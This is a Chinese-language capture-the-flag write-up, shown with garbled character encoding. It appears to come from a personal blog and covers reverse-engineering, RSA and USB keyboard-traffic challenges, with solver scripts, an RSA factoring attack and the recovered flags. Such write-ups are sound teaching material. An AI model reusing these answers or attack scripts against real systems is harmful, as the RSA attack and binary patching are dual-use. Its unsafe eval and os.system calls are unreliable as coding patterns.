å¡«å®Œå‚èµ›é—®å·ä¹‹åé‚®ä»¶è¢«å‘åˆ°äº†åƒåœ¾ç®±é‡Œé¢ï¼Œæ¯”èµ›å¼€æ‰“å¥½å‡ ä¸ªå°æ—¶äº†æ‰å‘ç° (æ‚²), ä¸è¿‡æˆç»©è¿˜æ˜¯ä¸é”™æ»´ï¼ŒæŠŠé€†å‘ ak å•¦ï¼Œç¬¬å››åè€¶ (â—â€™â—¡â€™â—) åˆ«çš„æ–¹å‘ misc å’Œ crypto ä¹Ÿç¨å¾®çœ‹äº†ä¸‹ï¼Œç®—æ˜¯é€†å‘ä¹‹å¤–çš„é—²æƒ…é›…è‡´ï¼š), ä½†æ€»å½’æ˜¯èƒ½åšå‡ºè¶…çº§ç®€å•çš„é¢˜ç›®çš„ï¼Œä½†æ˜¯ pwn æ˜¯çœŸçš„ä¸ä¼šï¼åšä¸äº†ä¸€ç‚¹â€¦ ä¸ä¼š pwn çš„äºŒè¿›åˆ¶æ‰‹åªèƒ½å½“é€†å‘æ‰‹äº†ğŸ˜‚ é¢˜ç›®é™„ä»¶: ç‚¹å‡»ä¸‹è½½ # reverse # Android åç¼–è¯‘ libjniex.so , å‘ç°è¿™ä¸ªè§£å¯†å‡½æ•°ï¼Œæ‰€ä½¿ç”¨çš„ç®—æ³•ä¸º SM4 å®‰è£… apk, æ‰“å¼€åå‘ç°ä¸¤ä¸ªç‰¹æ®Šå­—ç¬¦ä¸² 159762dr7vh438sa å’Œ 1313131313131313 äºæ˜¯å†™ä¸€ä¸‹ exp import base64from pysm4 import encrypt_cbc, decrypt_cbcimport base64key = \"159762dr7vh438sa\" # å¯†é’¥iv = \"1313131313131313\"cipher_text = bytes.fromhex(\"663630067D8CD8A2D819CCE0996A2FC49AEA6B31CCCC2EEE5BE59BFA0B56597CCECA2F502A4D1F92E3BC731D915E9CE4\") # åŠ å¯†åçš„æ•°æ®plain_text = decrypt_cbc(base64.b64encode(cipher_text), key, iv)print(plain_text)# flag&#123;just!_enjoy!_the_match!_zyc_2022&#125;# Animals ida æ‰“å¼€ main, å‘ç°æœ‰èŠ±æŒ‡ä»¤å½¢å¼å¦‚ä¸‹ï¼Œç”¨ idapython ä¿®å¤ä¸€ä¸‹ import idautilsimport idcdef my_nop(addr, endaddr): while addr &lt; endaddr: patch_byte(addr, 0x90) addr += 1pattern = [\"74 15 75 13 8D 44 24 FC 83 F0 22 3B 04 24 74 0A E8 1F 00 00 00 74 04\", \"74 0A 75 08 E8 10 00 00 00 EB 04 E8\", \"48 81 EC 08 03 00 00\"]for i in range(len(pattern)): cur_addr = 0x406300 end_addr = 0x406E2C while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, SEARCH_DOWN, pattern[i]) print(\"patch address: \" + hex(cur_addr)) # æ‰“å°æç¤ºä¿¡æ¯ if cur_addr == idc.BADADDR: break else: my_nop(cur_addr, cur_addr + len(pattern[i].split(' '))) cur_addr = idc.next_head(cur_addr)è¿™é‡Œå‡ºç°çš„å¸¸æ•°è¯´æ˜ç®—æ³•åº”è¯¥æ˜¯ MD5, è€Œä¸”å¸¸æ•°ä½ç½®ä¸ä¸€è‡´ï¼Œé‚£ä¹ˆè¿™åº”è¯¥æ˜¯é­”æ”¹çš„ md5 main å‡½æ•°çš„å‰ä¸¤è¡Œæœ‰ pthread åè°ƒè¯• è¿›å…¥ sub_405FF0 æŠŠé€€å‡ºé€»è¾‘ä¿®æ”¹ä½¿å…¶ä¸é€€å‡º jnz short loc_40603E â€“&gt; jz short loc_40603E åŠ¨æ€è°ƒè¯•å‘ç°æœ€ç»ˆæ¯”è¾ƒçš„æ•°ç»„å’Œé™æ€åˆ†æçš„æ•°ç»„ä¸ä¸€è‡´ï¼Œæ¨æµ‹åœ¨è¿è¡Œçš„è¿‡ç¨‹ä¸­è¿™ä¸ªæ¯”è¾ƒçš„æ•°ç»„è¿›è¡Œäº†ä¿®æ”¹ äºæ˜¯å¾—åˆ° exp, è¦æ³¨æ„ md5.c ä¸­çš„å¸¸æ•°è¦å’Œé¢˜ç›®ä¸­çš„å¸¸æ•°ä¸€è‡´ #include &lt;stdio.h>#include &lt;string.h>#include &lt;stdlib.h>#include \"md5.h\"unsigned char target[16] = &#123; 0xDD, 0xB2, 0x6D, 0xF3, 0xE6, 0x0A, 0xC7, 0x83, 0x4A, 0x93, 0x50, 0xB4, 0xA4, 0x59, 0xAB, 0x0E&#125;;void md5_enc(unsigned char encrypt[])&#123; int i; unsigned char decrypt[16]; MD5_CTX md5; MD5Init(&amp;md5); MD5Update(&amp;md5,encrypt,strlen((char *)encrypt)); MD5Final(&amp;md5,decrypt); //printf(\"%s\\n\",encrypt); for(i=0;i&lt;16;i++) &#123; if(target[i]!=decrypt[i])&#123; return; &#125; &#125; printf(\"%s\\n\",encrypt); exit(2);&#125;void printCombinations(char* str, int index) &#123; if (index == 9) &#123; //printf(\"%s\\n\", str); md5_enc(str); return; &#125; char* animal[] = &#123; \"cat\", \"dog\", \"fox\", \"panda\", \"dragon\",\"monkey\" &#125;; for (int i = 0; i &lt; 6; i++) &#123; strncat(str,animal[i],strlen(animal[i])); //strcat(str,animal[i]); //printf(\"%c\\n\",str[0]); printCombinations(str, index + 1); str[strlen(str) - strlen(animal[i])] = '\\0'; &#125;&#125;int main(int argc, char *argv[])&#123; char str[60]; str[0] = '\\0'; printCombinations(str, 0); return 0;&#125;è„šæœ¬è¾“å‡º catmonkeydogdragondogcatfoxpandapanda , é‚£ä¹ˆè¾“å…¥çš„æ•°å­—å°±åº”è¯¥æ˜¯ 051410233 md5 ä¸€ä¸‹å¾—åˆ° flag flag&#123;839c998c52db6618bb24c346b85a894f&#125; # E æŸ¥ä¸€ä¸‹å±æ€§ï¼Œè¿™ä¸ªç¨‹åºæ˜¯æ˜“è¯­è¨€å†™çš„ ç”¨ ida æ’ä»¶ E-Decompiler æ¥é™æ€åˆ†æä¸€ä¸‹ ä½¿ç”¨æ’ä»¶åå› ä¸ºæœ‰ä¸­æ–‡åå³è¾¹æ˜¾ç¤ºçš„åç§°ä¸º __ , ä½†æ˜¯æˆ‘åˆä¸å¤ªæƒ³ patch ida å»ä¿®å¤ï¼Œæ‰€ä»¥å°±ç´¢æ€§æŠŠæ‰€æœ‰ä¸­æ–‡çš„å‡½æ•°åæ‰‹å·¥ç¿»è¯‘æˆè‹±æ–‡å¥½äº† é€šè¿‡äº¤å‰å¼•ç”¨ wrong å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°ä¸»è¦å‡½æ•°åœ¨ sub_4010C8 åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼ŒåŠ å¯†æµç¨‹ä¸»è¦å°†å­—ç¬¦ä¸²å¹³å‡åˆ†æˆå·¦å³ä¸¤éƒ¨åˆ†å»è¿›è¡ŒåŠ å¯† ç”¨ python çš„è¯è¿™æ ·è¡¨ç¤º import ctypesimport stringdef left_enc(L_str): L_str.value = ((L_str.value &lt;&lt; 1) ^ 0xBF) >> 1 return L_strdef right_enc(L_str): L_str.value = ((L_str.value &lt;&lt; 1) ^ 0x81) >> 1 return L_strtext = \"0123456789.-\"res = string.printablefor ch in text: for i in res: out = left_enc(ctypes.c_uint8(ord(i))) if out.value == ord(ch): print(f\"&#123;i&#125;==> &#123;ch&#125;\",end='') for i in res: out = right_enc(ctypes.c_uint8(ord(i))) if out.value == ord(ch): print(f\" &lt;==&#123;i&#125;\")# nmlkjiqrstuv'''o==> 0 &lt;==pn==> 1 &lt;==qm==> 2 &lt;==rl==> 3 &lt;==sk==> 4 &lt;==tj==> 5 &lt;==ui==> 6 &lt;==vh==> 7 &lt;==wg==> 8 &lt;==xf==> 9 &lt;==yq==> . &lt;==nr==> - &lt;==m'''çœ‹äº†ä¸‹ç¬¬ä¸‰æ–¹åº“è¯†åˆ«ä¸å‡ºæ¥ï¼Œå°±åƒè¿™ä¸ªæ ·å­ é‚£å°±ä¸‹ä¸€ä¸ªæ˜“è¯­è¨€ï¼Œç„¶åæŠŠé‡Œé¢çš„ static_lib/eCalc_static.lib åˆ¶ä½œæˆ ida å¯ä»¥è¯†åˆ«çš„ sig æ–‡ä»¶ï¼Œç”¨åˆ°çš„å·¥å…·æ˜¯è¿™ä¸ª ç„¶å ida å¯¼å…¥è¿™ä¸ª sig å¯¼å…¥å®Œæˆä¹‹åå°±å¯ä»¥åˆ†æäº† é¦–å…ˆç ”ç©¶ä¸€ä¸‹æ˜“è¯­è¨€ä¸­çš„å¤§æ•°åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼ å†™äº†ä¸€ä¸ªä¾‹å­æ–¹ä¾¿å»åˆ†æ é™æ€ç¼–è¯‘ååŠ¨è°ƒä¸€ä¸‹çœ‹è¿™ä¸ª 4381875973072142 æ˜¯å¦‚ä½•å­˜å‚¨çš„ å¯ä»¥å‘ç°è¿™ä¸ªæ•°è¢«åˆ†ä¸ºäº†ä¸¤éƒ¨åˆ† 39FFE70Eh å’Œ byte_1101510 byte_1101510 ä¸­çš„å€¼ä¸º 42dcb3h äºæ˜¯æˆ‘ä»¬å¯ä»¥çŒœæµ‹ä¸€ä¸‹å¤§æ•°çš„å­˜å‚¨æ–¹å¼ï¼Œ 0x42dcb3 å’Œ 0x39ffe700e ç»è¿‡ä»€ä¹ˆæ ·å­çš„æ“ä½œæ‰å¯ä»¥å¾—åˆ° 0xf914e66d1ae0e æœ€ç»ˆç»è¿‡ä¸€ç•ªå°è¯•ä¹‹åå¾—åˆ° é‚£ä¹ˆå°±å¯ä»¥å¾—å‡ºå…¬å¼ï¼Œå‡è®¾ä¸€ä¸ªå¤§æ•° bignum è¢«åˆ†æˆäº† p1 , p2 ä¸¤éƒ¨åˆ†ï¼Œå…¶ä¸­ p1 ä¸ºé«˜ä½åˆ™æœ‰ å†çœ‹ä¸€ä¸‹å­—ç¬¦ä¸²åŠ å¯†ä¹‹åï¼Œåé¢å¾ªç¯çš„å†…å®¹ ç»è¿‡å¯¹å¤§æ•°å­˜å‚¨æ–¹å¼çš„åˆ†æï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„çŸ¥é“è¿™äº›è¦åšè¿ç®—çš„æ•°éƒ½æ˜¯äº›ä»€ä¹ˆäº† Str1=v69*0x70955fc45 Str2[1]=Str1*v69 Str2[0]=v69*0x34ED1CCB v62[1]=Str2[0]+0x0D1558 v62[0]=Str2[1]+v62[1] v61=v70-v62[0] v69 ä¸ºå¾ªç¯çš„å˜é‡ï¼Œv70 ä¸ºå­—ç¬¦ä¸²å·¦åŠéƒ¨åˆ†çš„æ•°å­— æ•´ç†ä¹‹å v61=v70-(v69*0x70955fc45*v69+v69*0x34ED1CCB+0x0D1558) é‚£è¦å¾—åˆ° v70 å°±éœ€è¦è¿™éƒ¨åˆ† (v69*0x70955fc45*v69+v69*0x34ED1CCB+0x0D1558) åŠ å›å»å°±å¯ä»¥äº† å†çœ‹ä¸€ä¸‹å¾—åˆ° flag çš„æ¡ä»¶ï¼Œé‚£ä¹ˆå·¦åŠéƒ¨åˆ†å°±æ˜¯ v69 ä» 1 åˆ° 800 ç´¯åŠ ï¼Œå³åŠéƒ¨åˆ†å°±æ˜¯ v69 ä» 1 åˆ° 900 ç´¯åŠ  è¿™ä¸€é¢˜çš„å·¦åŠéƒ¨åˆ†å¤§æ•°è¿ç®—çš„å¾ªç¯æ˜¯æœ‰é—®é¢˜çš„ï¼Œæˆ‘ä»¬å¯ä»¥è¯¦ç»†çœ‹çœ‹è¿™éƒ¨åˆ†çš„æ±‡ç¼–ä»¥åŠå¯¹åº”çš„æ ˆæŒ‡é’ˆ 40157A å¤„çš„æ±‡ç¼– add esp, 1Ch å°†æ ˆé¡¶æŒ‡é’ˆç”± 6C ç§»åˆ°äº† 50 , æ ˆé¡¶æŒ‡é’ˆåœ¨ 50 æŒ‡å‘çš„æ ˆçš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿæ‰¾åˆ° 401543 å¤„çš„ push ebx , è¿™ä¸ªä½ç½®å­˜å‚¨çš„æ˜¯ [ebp+left_checksum] , å³ leftchecksum çš„æŒ‡é’ˆåœ°å€ çœ‹åˆ° 4015AE å¤„çš„ push 2000Ah , è¿™é‡Œçš„æŒ‡é’ˆä½ç½®ä¹Ÿæ˜¯ 50 , ä¹Ÿå°±æ˜¯è¯´ï¼Œç…§ç€é¢˜ç›®çš„æ±‡ç¼–æ‰§è¡Œï¼Œæœ¬æ¥åœ¨æ ˆä¸­å­˜å‚¨ [ebp+left_checksum] çš„å†…å®¹å°†ä¼šè¢«è¦†ç›–æ‰ï¼Œäºæ˜¯ç¨‹åºèµ°åˆ° 4017D1 åï¼Œä¸èƒ½ pop å‡ºæ­£ç¡®çš„ [ebp+left_checksum] çš„å€¼ï¼Œç»™ ebx èµ‹çš„å€¼æ˜¯æœªçŸ¥çš„ï¼Œäºæ˜¯åœ¨ 401544 å¤„çš„ mov [ebx], ecx ä¼šäº§ç”Ÿå†…å­˜è®¿é—®å¼‚å¸¸ï¼Œæ‰€ä»¥å³ä½¿æ˜¯æ­£ç¡®çš„è¾“å…¥ï¼Œä¹Ÿä¸ä¼šè¾“å‡º right æˆ–è€… wrong , å› ä¸ºæ—©åœ¨å¤„ç†è¾“å…¥çš„å­—ç¬¦ä¸²çš„å·¦åŠéƒ¨åˆ†æ—¶ï¼Œå°±ä¼šå› ä¸ºå†…å­˜è¯»å–å¼‚å¸¸è€Œé€€å‡ºç¨‹åºäº† æ‰€ä»¥æˆ‘æŠŠ 40157A å¤„çš„æ±‡ç¼– add esp, 1Ch patch æˆäº† add esp, 18h , è®©æ ˆé¡¶æŒ‡é’ˆç§»åˆ° 54 è¿™ä¸ªä½ç½®ï¼Œæ¥ä¿è¯æ ˆå†…æ•°æ®çš„ç¨³å®šæ€§ï¼Œåç»­çš„åˆ†æä¹Ÿæ˜¯ç›´æ¥è·³è¿‡å·¦åŠéƒ¨åˆ†ï¼Œè€Œç›´æ¥å»åˆ†æå³åŠéƒ¨åˆ†çš„ è€Œä¸”å·¦åŠéƒ¨åˆ† 401570 å¤„è°ƒç”¨çš„å‡½æ•°ï¼Œæœ¬åº”è¯¥èµ‹å€¼ç»™ [ebp+var_18] çš„ [ebp+left_checksum] ä¹Ÿæ²¡æœ‰å‡ºç°ï¼Œæ¯”å¯¹ä¸€ä¸‹å·¦å³ä¸¤åŠéƒ¨åˆ†å­—ç¬¦ä¸²ä¸­ç›¸å¯¹äºå¾ªç¯ä½ç½®ç›¸åŒçš„å‡½æ•°è°ƒç”¨ (éƒ½æ˜¯å¾ªç¯å†…çš„ç¬¬ä¸€è¡Œå‡½æ•°å‡½æ•°è°ƒç”¨), å‘ç°æ˜¯å¹¶ä¸ç›¸åŒçš„ï¼Œä¼¼ä¹æ˜¯é¢˜ç›®å‡ºäº†äº›é—®é¢˜ ä¸è¿‡è¿˜æ˜¯å¯ä»¥é€šè¿‡ç±»æ¯”ï¼Œå¾—åˆ° flag çš„ï¼Œå› ä¸ºå·¦å³ä¸¤è¾¹çš„åŠ å¯†æ–¹å¼å‡ ä¹å®Œå…¨ç›¸åŒ è§£é‡Šå®Œé¢˜ç›®æœ¬èº«çš„é—®é¢˜ï¼Œç°åœ¨ç»™å‡º exp import ctypesimport stringdef left_enc(L_str): L_str.value = ((L_str.value &lt;&lt; 1) ^ 0xBF) >> 1 return L_strdef right_enc(L_str): L_str.value = ((L_str.value &lt;&lt; 1) ^ 0x81) >> 1 return L_str# print(chr(left_enc(ctypes.c_uint8(ord('&#123;'))).value))# print(chr(right_enc(ctypes.c_uint8(ord('&#125;'))).value))dic_left = &#123;&#125;dic_right = &#123;&#125;text = \"0123456789.\"res = string.printablefor ch in text: for i in res: out = left_enc(ctypes.c_uint8(ord(i))) if out.value == ord(ch): # print(f\"&#123;i&#125;==> &#123;ch&#125;\",end='') dic_left[ch] = i for i in res: out = right_enc(ctypes.c_uint8(ord(i))) if out.value == ord(ch): # print(f\" &lt;==&#123;i&#125;\") dic_right[ch] = i# nmlkjiqrstuv'''nnnnnnnnqqqqqqqqffffffffyyyyyyyyffffqfffyyyyqyyy999999==>0x11317d8''''''o==> 0 &lt;==pn==> 1 &lt;==qm==> 2 &lt;==rl==> 3 &lt;==sk==> 4 &lt;==tj==> 5 &lt;==ui==> 6 &lt;==vh==> 7 &lt;==wg==> 8 &lt;==xf==> 9 &lt;==yq==> . &lt;==nr==> - &lt;==m'''# v61=v70-(v69*0x70955fc45*v69+v69*0x34ED1CCB+0x0D1558)v70 = 0for v69 in range(1, 801): v70 = v70 + (v69 * 0x70955fc45 * v69 + v69 * 0x34ED1CCB + 0x0D1558)for i in str(v70): print(dic_left[i], end='')# print('')v70 = 0for v69 in range(1, 901): # v70 = (v69 * 0x70955fc45 * v69 + v69 * 0x34ED1CCB + 0x0D1558) v70 = v70 + (v69 * 0x70955fc45 * v69 + v69 * 0x34ED1CCB + 0x0D1558) # print(v70)for i in str(v70): print(dic_right[i], end='')# jnihhkjnhihomhmhmoowsuvtptwpsxpxrpxqpp# crypto # RSA åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹è¿™é¢˜å’Œ AntCTF x D^3CTF 2022 çš„ d3factor é•¿çš„å¾ˆåƒ äºæ˜¯å°±æŠŠ exp çš„è„šæœ¬æ‹¿è¿‡æ¥ï¼Œå‚æ•°æ¢æˆè¿™é¢˜ç»™çš„ï¼Œå°±å‡º flag äº† # sagemathfrom Crypto.Util.number import *import gmpy2,hashlibN=26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977c=15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437e=65537e1=8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221e2=22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079r = 7a = (e2 - e1) * gmpy2.invert(e1*e2,N) % N# assert a &lt; NP.&lt;x> = PolynomialRing(Zmod(N))f = x - ax = f.small_roots(X = 2^1000,beta = 0.4)x = x[0] k_phi = e1*e2*x - (e2 - e1)p_ = gcd(k_phi,N)p = gmpy2.iroot(int(p_),r - 1)[0]# print(p)q = N // (p**r)# print(q)n = p * qphi_n = (p - 1) * (q - 1)d = gmpy2.invert(e,phi_n)# print(n)m = pow(c,d,n)print(bytes.decode(long_to_bytes(int(m))))# flag&#123;RSA_1s_s0_ez_4nd_hwser_c4n_bre4k_1t!&#125;# misc # USB ä½¿ç”¨è„šæœ¬å¾—åˆ°é”®ç›˜çš„è¾“å…¥çš„å­—ç¬¦ import sys, argparse, osclass kbpaser: def __init__(self): #tshark å¯¼å‡ºæ–‡ä»¶ self.datafile=\"kbdatafile.txt\" self.presses= [] #Keyboard Traffic Dictionary self.normalKeys = &#123;\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET>\",\"29\":\"&lt;ESC>\",\"2a\":\"&lt;DEL>\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE>\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON>\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA>\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP>\",\"3a\":\"&lt;F1>\",\"3b\":\"&lt;F2>\", \"3c\":\"&lt;F3>\",\"3d\":\"&lt;F4>\",\"3e\":\"&lt;F5>\",\"3f\":\"&lt;F6>\",\"40\":\"&lt;F7>\",\"41\":\"&lt;F8>\",\"42\":\"&lt;F9>\",\"43\":\"&lt;F10>\",\"44\":\"&lt;F11>\",\"45\":\"&lt;F12>\"&#125; #Press shift self.shiftKeys = &#123;\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET>\",\"29\":\"&lt;ESC>\",\"2a\":\"&lt;DEL>\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE>\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"&#123;\",\"30\":\"&#125;\",\"31\":\"|\",\"32\":\"&lt;NON>\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA>\",\"36\":\"&lt;\",\"37\":\">\",\"38\":\"?\",\"39\":\"&lt;CAP>\",\"3a\":\"&lt;F1>\",\"3b\":\"&lt;F2>\", \"3c\":\"&lt;F3>\",\"3d\":\"&lt;F4>\",\"3e\":\"&lt;F5>\",\"3f\":\"&lt;F6>\",\"40\":\"&lt;F7>\",\"41\":\"&lt;F8>\",\"42\":\"&lt;F9>\",\"43\":\"&lt;F10>\",\"44\":\"&lt;F11>\",\"45\":\"&lt;F12>\"&#125; def tshark_do(self, pcapfile, filterfield, fieldvalue): if os.name == \"nt\": if filterfield is not None: command = f\"tshark -r &#123;pcapfile&#125; -Y &#123;filterfield&#125; -T fields -e &#123;fieldvalue&#125; > &#123;self.datafile&#125;\" else: command = f\"tshark -r &#123;pcapfile&#125; -T fields -e &#123;fieldvalue&#125; > &#123;self.datafile&#125;\" try: os.system(command) print(\"tsharkæ‰§è¡Œè¯­å¥ï¼š\" + command) print(\"[+] Found : tsharkå¯¼å‡ºæ•°æ®æˆåŠŸ\") except: print(\"tsharkæ‰§è¡Œè¯­å¥ï¼š\" + command) print(\"[+] Found : tsharkå¯¼å‡ºæ•°æ®å¤±è´¥\") elif os.name == \"posix\": #sed '/^\\s*$/d' ä¸»è¦æ˜¯å»æ‰ç©ºè¡Œ if filterfield not in None: command = f\"tshark -r &#123;pcapfile&#125; -Y &#123;filterfield&#125; -T fields -e &#123;fieldvalue&#125; | sed '/^\\s*$/d' > &#123;self.datafile&#125;\" else: command = f\"tshark -r &#123;pcapfile&#125; -T fields -e &#123;fieldvalue&#125; | sed '/^\\s*$/d' > &#123;self.datafile&#125;\" try: os.system(command) print(\"tsharkæ‰§è¡Œè¯­å¥ï¼š\" + command) print(\"[+] Found : tsharkå¯¼å‡ºæ•°æ®æˆåŠŸ\") except: print(\"tsharkæ‰§è¡Œè¯­å¥ï¼š\" + command) print(\"[+] Found : tsharkå¯¼å‡ºæ•°æ®å¤±è´¥\") #ç­›æ‰æ— ç”¨æ•°æ®ï¼Œæ”¹å˜æ•°æ®æ ¼å¼ def formatkbdata(self): formatfile = open(\"formatKbdatafile.txt\",\"w\") with open(self.datafile, \"r\") as f: for i in f: # if len(i.strip(\"\\n\")) == 8: # Bytes = [i[j:j+2] for j in range(0, len(i.strip(\"\\n\")), 2)] # data = \":\".join(Bytes) # formatfile.writelines(data+\"\\n\") if len(i.strip(\"\\n\")) == 16: Bytes = [i[j:j+2] for j in range(0, len(i.strip(\"\\n\")), 2)] data = \":\".join(Bytes) formatfile.writelines(data+\"\\n\") formatfile.close() def jiemi(self): print(\"\\n-----å¼€å§‹è§£å¯†Tsharkå¯¼å‡ºçš„é”®ç›˜æ•°æ®-----\\n\") # è¯»å–æ•°æ® z with open(\"formatKbdatafile.txt\", \"r\") as f: for line in f: self.presses.append(line[0:-1]) #å»æ‰æœ«å°¾çš„ \\n # å¼€å§‹å¤„ç† result = [] for press in self.presses: if press == '': continue #thark ç‰ˆæœ¬åŸå› ï¼Œå¯¼å‡ºæ•°æ®æ ¼å¼ä¸åŒ if ':' in press: Bytes = press.split(\":\") else: #ä¸¤ä¸¤åˆ†ç»„ Bytes = [press[i:i+2] for i in range(0, len(press), 2)] print(Bytes) if Bytes[0] == \"00\": if Bytes[2] != \"00\" and self.normalKeys.get(Bytes[2]): result.append(self.normalKeys[Bytes[2]]) # print(result) elif int(Bytes[0],16) &amp; 0b10 or int(Bytes[0],16) &amp; 0b100000: # shift key is pressed. if Bytes[2] != \"00\" and self.normalKeys.get(Bytes[2]): # result.append(self.normalKeys[Bytes[2]]) result.append(self.shiftKeys[Bytes[2]]) else: print(\"[-] Unknow Key : %s\" % (Bytes[0])) print(\"[+] USB_Found : %s\" % (result)) # print(type(result)) flag = 0 for i in range(len(result)): try: a = result.index('&lt;DEL>') del result[a] del result[a - 1] except: pass for i in range(len(result)): try: if result[i] == \"&lt;CAP>\": flag += 1 result.pop(i) if flag == 2: flag = 0 if flag != 0: result[i] = result[i].upper() except: pass # print ('\\n [+] é”®ç›˜æ•°æ® output :' + \"\".join (result)) # åˆ é™¤æå–æ•°æ®æ–‡ä»¶ rm_stat = eval(input(f\"-----æ˜¯å¦åˆ é™¤tsharkå¯¼å‡ºçš„æ–‡ä»¶ \\\"&#123;self.datafile&#125;\\\", 1 or 0-----\\n\")) if rm_stat == 1: os.remove(self.datafile)if __name__ == \"__main__\": #æˆ‘çš„ vscode å·¥ä½œåŒºçš„åŸå› ï¼Œéœ€è¦åˆ‡æ¢åˆ°å½“å‰ç›®å½• pwd = os.path.dirname(__file__) os.chdir(pwd) BANNER = r\"\"\" // / / // ) ) // ) ) // / / (( //___/ / ___ __ ___ ___ / ___ // / / \\\\ / __ ( // ) ) // ) ) // ) ) // ) ) //\\ \\ // / / ) ) // ) ) // // // / / // // \\ \\ ((___/ / ((___ / / //____/ / ((____ // ((___( ( ((____ // \\ \\ @MAY1AS\"\"\" print(BANNER) argobject = argparse.ArgumentParser(prog=\"UsbKbCracker\", description=\"\"\"This is a script for decrypt UsbKeyboardData \"\"\") argobject.add_argument('-f', \"--pcapfile\", required=True, help=\"here is your capturedata file\") argobject.add_argument('-e', \"--fieldvalue\", required=True, help=\"here is your output_format\") argobject.add_argument('-Y', \"--filterfield\", help=\"here is your filter\") arg = argobject.parse_args() kbparser = kbpaser() # tshark å¯¼å‡ºæ•°æ®ï¼Œå­˜å‚¨åœ¨ usbdatafile.txt å†… kbparser.tshark_do(pcapfile=arg.pcapfile, fieldvalue=arg.fieldvalue, filterfield=arg.filterfield) kbparser.formatkbdata() kbparser.jiemi() è·Ÿç€è¿™é‡Œçš„ USB_Found æ•²é”®ç›˜å¾—åˆ° Ao(mgHY$\\A@Q7gW2D$dE@6#oO0f&lt;Gm1hAI'/N#4&lt;AN;MS@PfrQ149K å¯ä»¥å‘ç°è¿™æ˜¯ BASE85 åŠ å¯† è§£å¯†ä¸€ä¸‹å¾—åˆ° flag flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"},{"name":"æ˜“è¯­è¨€","slug":"æ˜“è¯­è¨€","permalink":"https://oacia.dev/tags/%E6%98%93%E8%AF%AD%E8%A8%80/"}]},{"title":"DASCTF 2023å…­æœˆæŒ‘æˆ˜èµ› äºŒè¿›åˆ¶ä¸“é¡¹ RE 